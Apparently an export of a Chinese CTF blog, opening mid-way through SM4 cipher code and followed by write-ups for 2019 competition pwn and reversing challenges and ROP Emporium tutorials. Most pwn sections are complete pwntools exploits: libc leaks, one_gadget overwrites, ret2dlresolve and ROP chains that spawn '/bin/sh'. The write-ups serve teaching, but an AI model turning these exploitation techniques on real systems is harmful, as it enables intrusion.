sm4Sbox(a[3]); b[0] = Sbox[a[0]]; b[1] = Sbox[a[1]]; b[2] = Sbox[a[2]]; b[3] = Sbox[a[3]]; GET_ULONG_BE(bb,b,0) c =bb^(ROTL(bb, 2))^(ROTL(bb, 10))^(ROTL(bb, 18))^(ROTL(bb, 24)); return c;&#125;//一轮加密 static unsigned long sm4F(unsigned long x0, unsigned long x1, unsigned long x2, unsigned long x3, unsigned long rk)&#123; return (x0^sm4Lt(x1^x2^x3^rk));&#125;static void sm4_one_round( unsigned long sk[32], unsigned char input[16], unsigned char output[16] )&#123; unsigned long i = 0; unsigned long ulbuf[36]; memset(ulbuf, 0, sizeof(ulbuf)); GET_ULONG_BE( ulbuf[0], input, 0 ) GET_ULONG_BE( ulbuf[1], input, 4 ) GET_ULONG_BE( ulbuf[2], input, 8 ) GET_ULONG_BE( ulbuf[3], input, 12 ) while(i&lt;32) &#123; ulbuf[i+4] = sm4F(ulbuf[i], ulbuf[i+1], ulbuf[i+2], ulbuf[i+3], sk[i]);// #ifdef _DEBUG// printf("rk(%02d) = 0x%08x, X(%02d) = 0x%08x \n",i,sk[i], i, ulbuf[i+4] );// #endif i++; &#125; PUT_ULONG_BE(ulbuf[35],output,0); PUT_ULONG_BE(ulbuf[34],output,4); PUT_ULONG_BE(ulbuf[33],output,8); PUT_ULONG_BE(ulbuf[32],output,12);&#125;//ECB模式 void sm4_crypt_ecb( sm4_context *ctx, int mode, int length, unsigned char *input, unsigned char *output)&#123; while( length &gt; 0 ) &#123; sm4_one_round( ctx-&gt;sk, input, output ); input += 16; output += 16; length -= 16; &#125; &#125;//ECB模式解密密钥 void sm4_setkey_dec( sm4_context *ctx, unsigned char key[16] )&#123; int i; ctx-&gt;mode = SM4_ENCRYPT; sm4_setkey( ctx-&gt;sk, key ); for( i = 0; i &lt; 16; i ++ ) &#123; SWAP( ctx-&gt;sk[ i ], ctx-&gt;sk[ 31-i] ); &#125;&#125;//CBC模式加解密 void sm4_crypt_cbc( sm4_context *ctx, int mode, int length, unsigned char iv[16], unsigned char *input, unsigned char *output )&#123; int i; unsigned char temp[16]; if( mode == SM4_ENCRYPT ) &#123; while( length &gt; 0 ) &#123; for( i = 0; i &lt; 16; i++ ) output[i] = (unsigned char)( input[i] ^ iv[i] ); sm4_one_round( ctx-&gt;sk, output, output ); memcpy( iv, output, 16 ); input += 16; output += 16; length -= 16; &#125; &#125; else /* SM4_DECRYPT */ &#123; while( length &gt; 0 ) &#123; memcpy( temp, input, 16 ); sm4_one_round( ctx-&gt;sk, input, output ); for( i = 0; i &lt; 16; i++ ) output[i] = (unsigned char)( output[i] ^ iv[i] ); memcpy( iv, temp, 16 ); input += 16; output += 16; length -= 16; &#125; &#125;&#125; int main()&#123; unsigned char key[16] = &#123;0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10&#125;; unsigned char input[16] = &#123;0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10&#125;; unsigned char output[16]; sm4_context ctx; unsigned long i; //encrypt sm4_setkey_enc(&amp;ctx,key); sm4_crypt_ecb(&amp;ctx,1,16,input,output); //加密结果 printf("加密结果：\n"); for(i = 0;i&lt; 16;i ++)&#123; printf("%02x ",output[i]); &#125; printf("\n"); sm4_setkey_dec(&amp;ctx,key); sm4_crypt_ecb(&amp;ctx,0,16,output,output); //解密结果 printf("解密结果：\n"); for(i = 0;i&lt; 16;i ++)&#123; printf("%02x ",output[i]); &#125; printf("\n"); return 0; &#125; 参数文章：https://blog.csdn.net/cg129054036/article/details/83012721 https://blog.csdn.net/cg129054036/article/details/83016958 https://blog.csdn.net/archimekai/article/details/53095993]]></content>
      <categories>
        <category>crypto</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019全国大学生信息安全大赛部分Wp]]></title>
    <url>%2F2019%2F04%2F23%2F2019%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[pwnyour_pwn先check 一下，发现保护全开，还是有点慌的 进入到IDA审计代码 在其主要代码里存在下标溢出，很明显地可以进行任意地址读和写（因为对于数组v4的下标v1没有进行任何的限制)，思路其实就出来了，先利用任意地址读泄漏出真实地址，再通过任意地址写将返回地址修改成onegadget 只是这里的读和写处理有点麻烦而已，因为它是单个字节读取和写入的，所以每次都要进行6次操作。 先确定v4[0]的位置gdb下断第一次输入v4[0]=100(0x64)单步跟踪找到0x64的位置 确定返回地址和要泄漏的真实地址跟v4[0]的偏移 这里其实我还算出另一个偏移：就是v1跟v4[0]的偏移，是40，为最后的退出getshell做准备，同样找到v1的位置就可以了，这里我就不截图了。 获得onegadget地址找泄漏出真实地址之后 就可以得到偏移，再查看onegadget：one_gadget+libc库 修改返回地址为onegadgetexp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#coding:utf-8from pwn import *context.log_level = 'debug'#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) p = process('./pwn')# p = remote("1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com","57856")elf = ELF('./pwn')libc = elf.libc# print libc# pause()p.recvuntil('name:')p.sendline('n0va')#泄漏__libc_start_main+240，每次泄漏一个字节p.recvuntil('input index\n')p.sendline('632')p.recvuntil('now value(hex) ')a = int(p.recv(2),16)print hex(a)p.recvuntil('input new value\n')p.sendline('1')p.recvuntil('input index\n')p.sendline('633')p.recvuntil('now value(hex) ')b = (int(p.recvuntil('\n')[:-1],16))&amp;0xffprint hex(b)p.recvuntil('input new value\n')p.sendline('1')p.recvuntil('input index\n')p.sendline('634')p.recvuntil('now value(hex) ')c = int(p.recvuntil('\n')[:-1],16)&amp;0xffprint hex(c)p.recvuntil('input new value\n')p.sendline('1')p.recvuntil('input index\n')p.sendline('635')p.recvuntil('now value(hex) ')d = int(p.recvuntil('\n')[:-1],16)&amp;0xffprint hex(d)p.recvuntil('input new value\n')p.sendline('1')p.recvuntil('input index\n')p.sendline('636')p.recvuntil('now value(hex) ')e = int(p.recvuntil('\n')[:-1],16)&amp;0xffprint hex(e)p.recvuntil('input new value\n')p.sendline('1')p.recvuntil('input index\n')p.sendline('637')p.recvuntil('now value(hex) ')f = int(p.recvuntil('\n')[:-1],16)&amp;0xffprint hex(f)p.recvuntil('input new value\n')p.sendline('1')print hex(a),hex(b),hex(c),hex(d),hex(e),hex(f)libc_start_main = hex(f)[2:] + hex(e)[2:] + hex(d)[2:] + hex(c)[2:] + hex(b)[2:] + hex(a)[2:]libc_main = int(libc_start_main,16)-240 #拼接得到__libc_start_main地址print hex(int(libc_start_main,16))print hex(libc_main)offset = libc_main - libc.symbols['__libc_start_main'] #偏移one_gadget = offset + 0x45216 #onegadget地址print "one_gadget--&gt; " + hex(one_gadget)#修改返回地址，每次一个字节写入a = one_gadget&amp;0xffb = one_gadget&gt;&gt;8&amp;0xffc = one_gadget&gt;&gt;16&amp;0xffd = one_gadget&gt;&gt;24&amp;0xffe = one_gadget&gt;&gt;32&amp;0xfff = one_gadget&gt;&gt;40&amp;0xffprint hex(a),hex(b),hex(c),hex(d),hex(e),hex(f)p.recvuntil('input index\n')p.sendline('344')p.recvuntil('input new value\n')p.sendline(str(a))p.recvuntil('input index\n')p.sendline('345')p.recvuntil('input new value\n')p.sendline(str(b))p.recvuntil('input index\n')p.sendline('346')p.recvuntil('input new value\n')p.sendline(str(c))p.recvuntil('input index\n')p.sendline('347')p.recvuntil('input new value\n')p.sendline(str(d))p.recvuntil('input index\n')p.sendline('348')p.recvuntil('input new value\n')p.sendline(str(e))p.recvuntil('input index\n')p.sendline('349')p.recvuntil('input new value\n')p.sendline(str(f))#修改i=40退出 循环p.recvuntil('input index\n')p.sendline('-4')p.sendline('40')p.recvuntil('do you want continue(yes/no)? \n')p.sendline('no')# flag&#123;1ed0e270f57c4e3969415180490fa07e&#125;p.interactive() baby_pwncheck，只开了NX 程度很简单，一个栈溢出漏洞，没有任何其它可用的函数，程序干净得可怕，其实就很容易想到runtime_resolve了，直接改脚本 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal','-x','bash','-c']context(arch='amd64', os='linux')# p = process('./pwn')p = remote("da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com","33865")elf = ELF('./pwn')read_plt = elf.plt['read']alarm_got = elf.got['alarm']# write_plt = elf.plt['write']bss_addr = elf.bss()bss_stage1 = 0x800 + bss_addrbss_stage2 = 80 + bss_stage1ppp_ret = 0x080485d9pop_ebp = 0x080485dbleave_ret = 0x08048448#read(0,bss_addr,100)payload = 'a'*44payload += p32(read_plt)payload += p32(ppp_ret)payload += p32(0)payload += p32(bss_stage1)payload += p32(100)payload += p32(pop_ebp)payload += p32(bss_stage1)payload += p32(leave_ret)# p.recvuntil('Welcome to XDCTF2015~!\n')# gdb.attach(p,"b *0x08048546")# pause()p.sendline(payload)cmd = '/bin/sh'plt_0 = 0x8048380rel_plt = 0x804833cindex_offset = (bss_stage1+28) - rel_plt# write_got = elf.got['write']dynsym = 0x080481dc #objdump -s -j .dynsym bofdynstr = 0x804827c #objdump -s -j .dynstr boffake_sym_addr = bss_stage1+36align = 0x10 -((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym&lt;&lt;8) | 0x7fack_reloc = p32(alarm_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrst_name = (fake_sym_addr + 0x10) - dynstr #加0x10是因为Elf32_Sym的大小为0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload = 'aaaa'payload += p32(plt_0)payload += p32(index_offset)payload += 'aaaa'payload += p32(bss_stage2)payload += 'aaaaaaaa'payload += fack_reloc #(bss_stage1+28)的位置payload += 'b'*alignpayload += fake_sym #(bss_stage1+36)的位置 payload += "system\x00"payload += 'a'*(80-len(payload))payload += cmd + '\x00'# payload += 'a'*(100-len(payload))p.sendline(payload)p.interactive()# flag&#123;4b91ebbdb3a0728572005c035aade579&#125; reeasyGo无符号GoLang，贴上网上一篇介绍GoLang逆向的文章，此题就是文章中的demon，flag 都没变，https://www.jishuwen.com/d/2NaJ 再附上一篇无符号Golang程序逆向方法解析https://www.anquanke.com/post/id/170332]]></content>
      <categories>
        <category>2019-iscc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[DDCTF的两道简单逆向]]></title>
    <url>%2F2019%2F04%2F18%2FDDCTF%E4%B9%8Bre%2F</url>
    <content type="text"><![CDATA[re132位PE文件，加了upx壳，先脱壳，随便一个工具就可以 脱完壳扔IDA， 逻辑其实很简单就是输入一串字符串，经过sub_401000这个函数处理之后，结果跟”DDCTF{reverseME}”进行比较 那么主要就是分析这个函数了， 虽然看起来干干净净，但是会发现有几个地方，v1定义了之后 直接用了，并没有任何的赋值，静态是看不出个所以然来的，所以我选择OD一波 这就是加密函数的汇编0x402FF8对应的就是数组 byte_402FF8，在IDA里可以看到，其实就是ASCII码表上的所以有值， 从0x20到0x7e就是可见字符，这个函数里面最核心的就是这句汇编mov dl byte ptr ds:[eax+0x402FF8]，它就是通过你输入的字符，倒着来找，其实就是把0x20~0x7e倒一下然后一一对应就没了（所以就很类似异或），把DDCTF{reverseME}，扔进去再倒一下就能得到正确的输入了 re2这也是一道 32位PE逆向，加了aspack壳，也找个脱壳工具一脱就行，不过有个问题就是，脱完壳不能运行了，不过逻辑是没有错的，所以要动态调的话就用没脱壳的就行 汇编直接逆先说一说头铁的做法，直接OD跟踪写出加密过程，再根据加密过程写去解密脚本，粗略地，的IDA上可以看到第一步检测和第一步加密 检测输入，长度为偶数，只能是[0,9]和[‘A’,’B’] （其实就是限制只能输入16进制数） 第一步加密，这里的加密逻辑还是可以从IDA里看出来的，（说白了就是将输入的字符转成16进制数，两个字符是一个16进制 嘛 ）但是接下来的加密看起来就会有点懵（但是它就只是个base64加密，后面再讲），所以就去OD跟一下看看情况喽 因为用的是未脱壳的程序，在pushad后，下ESP硬件断点，F9运行至popad后 单步到程序的真正入口，就可以搜索到程序的字符，下断，F9过去 单步进去加密函数，接下来就是单步看汇编，整出来的结果就是 12345a = x&gt;&gt;2;b = ((x&amp;3)&lt;&lt;4)+(y&gt;&gt;4);c = ((y&amp;0xf)*4)+(z&gt;&gt;6);d = z&amp;0x3f;(x,y,z为我们输入的三个16进制数（也就是6位字符）) 最后将a,b,c,d拼在一起就是结果 ，出来跟’DDCTF{reverse+}’比较，逆回去其实很简单，就是已知a,b,c,d求，x,y,z，reverse+共8位，所以两次爆破就可以了 1234567891011121314151617181920212223242526for(int x=0;x&lt;=256;x++)&#123; for(int y=0;y&lt;=256;y++)&#123; for(int z=0;z&lt;=256;z++)&#123; if(0x2b == x/4 &amp;&amp; 0x1e == (x&amp;3)*16+y/16 &amp;&amp; 0x2f == (y&amp;0xf)*4+z/64 &amp;&amp; 0x1e == (z&amp;0x3f)) &#123; printf("%02x %02x %02x\n",x,y,z); &#125; &#125; &#125;&#125;for(int x=0;x&lt;=256;x++)&#123; for(int y=0;y&lt;=256;y++)&#123; for(int z=0;z&lt;=256;z++)&#123; if(0x2b == x/4 &amp;&amp; 0x2c == (x&amp;3)*16+y/16 &amp;&amp; 0x1e == (y&amp;0xf)*4+z/64 &amp;&amp; 0x3e == (z&amp;0x3f)) &#123; printf("%02x %02x %02x\n",x,y,z); &#125; &#125; &#125;&#125; base64 其实这题的正解应该是base64，这也是常规的base64加密，只不过不是以输入字符去加密，而是直接输入16进制，也就是可以加密所有包括不可见字符，第一步转成16进制数就不用再说了，第二步的就是base64编码 所以我们只需要实现一个base64解码，以16进制形式输出就行了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main()&#123; char base64code[65] = &#123;'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/','='&#125;; char s[2048]; gets(s); int l = strlen(s); int t = 0; char a[4]; while(t&lt;l)&#123; char x,y,z; int temp = 0; for(int i=0;i&lt;4;i++)&#123; a[i] = s[t++]; if(a[i]&gt;='A'&amp;&amp;a[i]&lt;='Z') a[i] = a[i]-'A'; else if(a[i]&gt;='a'&amp;&amp;a[i]&lt;='z') a[i] = a[i]-'G'; else if(a[i]&gt;='0'&amp;&amp;a[i]&lt;='9') a[i] = a[i] + 4; else if(a[i] == '=')&#123; a[i] = a[i] + 3; if(t == l)&#123; temp = 1; t = l; break; &#125; else&#123; temp = 2; t = l; break; &#125; &#125; else if(a[i] == '+') a[i] = a[i] + 19; else if(a[i] == '/') a[i] = a[i] + 16; &#125; if(!temp)&#123; x = (a[0]&lt;&lt;2) + (a[1]&gt;&gt;4); y = (a[1]&lt;&lt;4) + (a[2]&gt;&gt;2); z = (a[2]&lt;&lt;6) + (a[3]); &#125; else if(!(temp-1))&#123; x = (a[0]&lt;&lt;2) + (a[1]&gt;&gt;4); y = (a[1]&lt;&lt;4) + (a[2]&gt;&gt;2); z = ' '; &#125; else&#123; x = (a[0]&lt;&lt;2) + (a[1]&gt;&gt;4); y = ' '; z = ' '; &#125; // printf("%c%c%c",x,y,z); printf("%x %x %x ",x&amp;0xff,y&amp;0xff,z&amp;0xff); &#125; printf("\n"); return 0;&#125; 转成大写字母就是flag了]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019安恒杯1月月赛]]></title>
    <url>%2F2019%2F04%2F04%2F2019%E5%AE%89%E6%81%92%E6%9D%AF1%E6%9C%88%E6%9C%88%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[python_crackme（拿安恒杯1月月赛的题目she来讲）首先，你会拿到一个由python编译的exe文件，使用pyinstxtractor.py脚本（下载地址）反编译exe文件 得到一个文件夹里面有一大堆东西 用010editor打开与exe文件同名的二进制文件 添加上python3.6的.pyc文件的文件头（即前12字节）然后再加上后缀名.pyc 再在线反编译一下（反编译地址）即可得到python源码：1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python# encoding: utf-8# 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pycimport osn1 = input('Tell me your name?')n2 = input('Tell me your pasw')n11 = chr(ord(n1[0]) + 12)s = ''st3 = '51e'st2 = '9f1ff1e8b5b91110'st1 = 'c4e21c11a2412'st0 = 'wrong'if n11 + 'AnHeng' == n2: for i in range(0, 4): s += st1[3 - i] print('Congratulations') ts = st2[0] + st3 + st2[1] + s print('flag&#123;' + st3[:1] + st1 + st2 + st3[-2:] + '&#125;') os.system('pause')else: print('no,' + st0)import osn1 = input('Tell me your name?')n2 = input('Tell me your pasw')n11 = chr(ord(n1[0]) + 12)s = ''st3 = '51e'st2 = '9f1ff1e8b5b91110'st1 = 'c4e21c11a2412'st0 = 'wrong'if n11 + 'AnHeng' == n2: for i in range(0, 4): s += st1[3 - i] print('Congratulations') ts = st2[0] + st3 + st2[1] + s print('flag&#123;' + st3[:1] + st1 + st2 + st3[-2:] + '&#125;') os.system('pause')else: print('no,' + st0) old-diver32位pe文件，无壳 IDA分析：将v9的类型修改为char[]型，同时可以看到这里到401000处理的代码进行了加密异或，先解密一波：123456s = get_bytes(0x401000,0x260)buf = ''for i in s: buf += chr(ord(i)^0xbb)from idaapi import *patch_bytes(0x401000,buf) 重新构造解密部分函数，先undefine the current function（快捷键u）再 creat a function（快捷键p），重新F5，可以看到两个函数已经恢复正常 可以开始分析程序了第一步验证前5位：”flag{“然后进入sub_4010b0函数第二步异或 第三步：base64加密，”c19zbWNf”解码第四步：走迷宫 123456789-------- 上下左右g + + 2 a q w+ + ++ ++ + #+ ++ ++++ ++ ++++ ++ +--------waaaaawwwww22222qqqaaw 最终得到flag:flag{this_is_smc_waaaaawwwww22222qqqaaw}]]></content>
      <categories>
        <category>安恒杯</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn入门之ROP]]></title>
    <url>%2F2019%2F04%2F04%2Fpwn%E5%85%A5%E9%97%A8%E4%B9%8BROP%2F</url>
    <content type="text"><![CDATA[ret2winROP Emporium 放到IDA很容易就找到溢出点123char s; // [esp+0h] [ebp-28h] 可以看出s距ebp的偏移量为0x28所以我们写入0x28正好可以写到ebp之前，要覆盖ebp还需要再写入4个字节（32位） 有一点值得引起注意，我们回车换行符同样会输入进去，明确溢出点以及可溢出的字节后接下来我们就开始构造rop，但在之前我们还应该检查一下程序开户了哪些保护，这决定了我们该采取何种rop攻击方式 exp 如下 ：123456from pwn import *sh = process('./ret2win32')ret2win32 = 0x08048659payload = 'A' * 0x28 + p32(0) + p32(ret2win32)sh.sendline(payload)sh.interactive() 64位的溢出点也一样exp:123456from pwn import *sh = process('./ret2win')ret2win = 0x400811payload = "A" * 0x20 + p64(0) + p64(ret2win)sh.sendline(payload)sh.interactive() split溢出点还是一样，不过少了可直接利用的函数，但是程序中提供了system函数和字符串”/bin/cat flag.txt”，同样ret到system并且通过栈传入”/bin/cat flag.txt”即可exp: 1234567from pwn import *sh = process('./split32')system = 0x08048657cat = 0x0804A030pyaload = 'A' * 0x28 + p32(0) + p32(system) + p32(cat)sh.sendline(pyaload)sh.interactive() 因为64位rdi是存储函数的第一个参数，所以我们需要pop rdi ;ret通过命令1ROPgadget --binary ./split --only &quot;pop|ret&quot; 找到gadget12345678910111213Gadgets information============================================================0x000000000040087c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040087e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400880 : pop r14 ; pop r15 ; ret0x0000000000400882 : pop r15 ; ret0x000000000040087b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040087f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004006b0 : pop rbp ; ret0x0000000000400883 : pop rdi ; ret0x0000000000400881 : pop rsi ; pop r15 ; ret0x000000000040087d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004005b9 : ret 64位exp:12345678from pwn import *sh = process('./split')system = 0x4005E0cat_flag = 0x601060pop = 0x400883payload = "A" * 0x20 + p64(0) + p64(pop) + p64(cat_flag) + p64(system)sh.sendline(payload)sh.interactive() callme溢出点还是一样，不过现在程序 没有system函数，flag也不是直接cat flag.txt得到，而是通过callme_one,callme_two,callme_three三个函数的调用计算得到，我们看一下.so文件 这里要求传入的三个参数为1，2，3，接下来写exp这里需要注意，因为要连续调用3个函数，所以需要注意callme_one调用完了之后的返回地址不能再向前两道一样随便写p32(0)了，这里是为了保持栈的平衡，callme_one执行完之后 要把它的三个参数1,2,3弹出去，esp才能指向p32(callme_two)12345678910111213from pwn import *sh = process('./callme32')pop3_ret = 0x80488a9callme_one = 0x080485C0callme_two = 0x08048620callme_three = 0x080485B0payload = ""payload += "a" * 0x28 + p32(0)payload += p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_two) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_three) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)sh.sendline(payload)sh.interactive() 12345678payload += p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)其中的pop3_ret 是为了把 p32(1) + p32(2) + p32(3)弹出栈，最后一个ret指令相当于pop eip也就是把栈顶的内容传给eip，从而改变执行流程，在执行完三次pop后，esp已经指向p32(callme_two)，这样就可以接着去指向第二段rop从而顺利调用callme_two(1,2,3)poppoppopret地址可以用objdump找到 如果对此不太好理解的话，可以进入gdb一步步跟着调试，可以看清楚具体的流程 只有将1，2，3pop出去esp才能指向callme_two。 64位程序 ，就不需要栈平衡了，在64位下，前6个参数通过rdi,rsi,rdx,rcx,r8,r9传递，所以需要找到pop rdi;pop rsi ;pop rdx ret 的gadget可以用 objdump -d callme | grep -A 3 pop找到 也可以用ROPgadget –binary ./callme –only “pop|ret”12345678910111213141516Gadgets information============================================================0x0000000000401b1c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401b1e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401b20 : pop r14 ; pop r15 ; ret0x0000000000401b22 : pop r15 ; ret0x0000000000401b1b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401b1f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000401900 : pop rbp ; ret0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret0x0000000000401b23 : pop rdi ; ret0x0000000000401ab2 : pop rdx ; ret0x0000000000401b21 : pop rsi ; pop r15 ; ret0x0000000000401ab1 : pop rsi ; pop rdx ; ret0x0000000000401b1d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004017d9 : ret exp:123456789101112131415161718from pwn import *sh = process('./callme')callme_one = 0x401850callme_two = 0x401870callme_three = 0x401810# pop_rdi = 0x401b23# pop_rsi_rdx = 0x401ab1pop_rdi_rsi_rdx_ret = 0x401ab0payload = ""payload += 'a' * 0x20 + p64(0)# payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_rdx) + p64(2) + p64(3) + p64(callme_one)# payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_rdx) + p64(2) + p64(3) + p64(callme_two)# payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_rdx) + p64(2) + p64(3) + p64(callme_three)payload += p64(pop_rdi_rsi_rdx_ret) + p64(1) + p64(2) + p64(3) + p64(callme_one)payload += p64(pop_rdi_rsi_rdx_ret) + p64(1) + p64(2) + p64(3) + p64(callme_two)payload += p64(pop_rdi_rsi_rdx_ret) + p64(1) + p64(2) + p64(3) + p64(callme_three)sh.sendline(payload)sh.interactive() write4write432： 同样的溢出点，但是这次没有/bin/sh，需要我们自己写到data中或者bss 中，两种写法没什么不同，就改个地址而已，这里就只说写到data段中，“/bin/sh”在32位中需要分两次写到 data 中去，用ROPgadget 查找可用的gadget 先： 123这里用到 0x08048670 : mov dword ptr [edi], ebp ; ret0x080486da : pop edi ; pop ebp ; ret exp :1234567891011121314151617181920212223242526# -*- coding:UTF-8 -*-from pwn import *sh = process('./write432')data_addr = 0x0804A028 #写入到 data 段# bss_addr = 0x0804A040 #写入到 bss 段system_ply = 0x08048430pop_edi_ebp = 0x080486damov_edi_ebp = 0x08048670payload = ""payload += 0x28 * "A" + p32(0)payload += p32(pop_edi_ebp)# payload += p32(bss_addr)payload += p32(data_addr)payload += "/bin"payload += p32(mov_edi_ebp)payload += p32(pop_edi_ebp)# payload += p32(bss_addr + 4)payload += p32(data_addr + 4)payload += "/sh\x00"payload += p32(mov_edi_ebp)payload += p32(system_ply)payload += p32(0)# payload += p32(bss_addr)payload += p32(data_addr)sh.sendline(payload)sh.interactive() write4:一样的思路，只不过在写入data的时候64位可以一次写入12345678910111213141516171819202122# -*- coding:UTF-8 -*-from pwn import *sh = process('./write4')# bss_addr = 0x0000000000601060 #写入到 bss 段data_addr = 0x0000000000601050 #写入到 data 段mov_r14_r15 = 0x0000000000400820pop_r14_r15 = 0x0000000000400890system_plt = 0x00000000004005E0pop_rdi = 0x0000000000400893payload = ""payload += 0x20 * "A" + p64(0)payload += p64(pop_r14_r15)payload += p64(data_addr)# payload += p64(bss_addr)payload += "/bin/sh\x00"payload += p64(mov_r14_r15)payload += p64(pop_rdi)# payload += p64(bss_addr)payload += p64(data_addr)payload += p64(system_plt)sh.sendline(payload)sh.interactive() badchars这次的程序对输入的字符进行了过滤,对于特定字符b,i,c/ &lt;空格&gt;,f,n.s，会被替换成-21，当然这会对我们成功写入”/bin/sh\x00”造成影响，所以我们要绕过这步替换12345678910111213141516171819202122232425 v3[0] = 'b'; v3[1] = 'i'; v3[2] = 'c'; v3[3] = '/'; v3[4] = ' '; v3[5] = 'f'; v3[6] = 'n'; v3[7] = 's'; j = 0LL; for ( i = 0LL; ; ++i ) &#123; result = i; if ( i &gt;= a2 ) break; for ( j = 0LL; j &lt;= 7; ++j ) &#123; if ( *(a1 + i) == v3[j] ) &#123; *(a1 + i) = -21; break; &#125; &#125; &#125; return result;&#125; 可以用xor将 “/bin/sh\x00”先进行加密，成功写入后再解密进行传参，先来找一下可以异或的数字：12345678910111213141516binsh = "/bin/sh\x00"badchar = [98, 105, 99, 47, 32, 102, 110, 115]# for i in badchar:# print chr(i)xornum = 1while 1: for x in binsh: tem = ord(x) ^ xornum if tem in badchar: xornum += 1 break if x == "\x00": print xornum xornum += 1 if xornum == 10: break 找到2，3，5，9，接下来查找一下gadget123456789101112131415161718192021$ ROPgadget --binary ./badchars32 --only &quot;mov|pop|ret|xor&quot;Gadgets information============================================================0x08048607 : mov al, byte ptr [0xc9010804] ; ret0x08048893 : mov dword ptr [edi], esi ; ret0x08048570 : mov ebx, dword ptr [esp] ; ret0x080488fb : pop ebp ; ret0x08048896 : pop ebx ; pop ecx ; ret0x080488f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x08048461 : pop ebx ; ret0x08048897 : pop ecx ; ret0x080488fa : pop edi ; pop ebp ; ret0x0804889a : pop edi ; ret0x080488f9 : pop esi ; pop edi ; pop ebp ; ret0x08048899 : pop esi ; pop edi ; ret0x0804844a : ret0x0804885e : ret 0xd750x080485be : ret 0xeac10x08048890 : xor byte ptr [ebx], cl ; retUnique gadgets found: 16 因为32位程序一次只能传4个字符，所以需要分两次传exp:123456789101112131415161718192021222324252627282930313233343536# -*- coding:UTF-8 -*-from pwn import *sh = process('./badchars32')sysetm_plt = 0x080484E0binsh = "/bin/sh\x00"xorbinsh = ""#加密for i in binsh: xorbinsh += chr(ord(i) ^ 2)mov_edi_esi = 0x08048893pop_esi_edi = 0x08048899pop_ebx_ecx = 0x08048896xor_ebx_cl = 0x08048890bss_addr = 0x0804A044payload = ""payload += 0x28 * "A" + p32(0)#分两次传payload += p32(pop_esi_edi)payload += xorbinsh[0:4]payload += p32(bss_addr)payload += p32(mov_edi_esi)payload += p32(pop_esi_edi)payload += xorbinsh[4:8]payload += p32(bss_addr + 4)payload += p32(mov_edi_esi)#解密for x in range(0,len(xorbinsh)): payload += p32(pop_ebx_ecx) payload += p32(bss_addr + x) + p32(2) payload += p32(xor_ebx_cl)payload += p32(sysetm_plt) + p32(0) + p32(bss_addr)sh.sendline(payload)sh.interactive() 64位程序 ：一样的思路，先查一下gadget :1234567891011121314151617181920212223242526272829$ ROPgadget --binary ./badchars --only &quot;mov|pop|ret|xor&quot;Gadgets information============================================================0x0000000000400853 : mov byte ptr [rip + 0x20084e], 1 ; ret0x0000000000400b35 : mov dword ptr [rbp], esp ; ret0x00000000004008ee : mov eax, 0 ; pop rbp ; ret0x0000000000400a3b : mov eax, dword ptr [rbp - 8] ; pop rbp ; ret0x0000000000400b34 : mov qword ptr [r13], r12 ; ret0x0000000000400a3a : mov rax, qword ptr [rbp - 8] ; pop rbp ; ret0x0000000000400bac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; 